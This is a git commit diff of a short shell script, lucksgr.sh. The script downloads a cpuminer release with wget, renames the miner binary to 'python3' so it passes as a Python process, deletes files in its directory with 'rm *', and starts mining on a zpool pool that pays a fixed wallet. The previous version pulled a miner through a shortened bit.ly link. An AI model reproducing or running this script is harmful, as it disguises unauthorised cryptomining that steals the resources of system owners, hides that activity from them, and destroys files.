76dbb1662ababa4479b5c11504fbf4339e1b8e30
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-20 09:33:48 +0700

    Update lucksgr.sh

--- lucksgr.sh
+++ lucksgr.sh
@@ -1,10 +1,16 @@
 
-wget -O dot https://bit.ly/kontolrum
+wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
 
-tar xvf dot
+tar -xzf dot
 
-cd SRBMiner-Multi-2-4-7
+rm dot
 
-mv SRBMiner-MULTI python3
+mv cpuminer-sse2 python3
 
-./python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
+mv python3 ~/
+
+rm *
+
+cd ~/
+
+./python3 -a  yespowersugar -o stratum+tcp://yespowerSUGAR.sea.mine.zpool.ca:6241 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt -p c=DGB
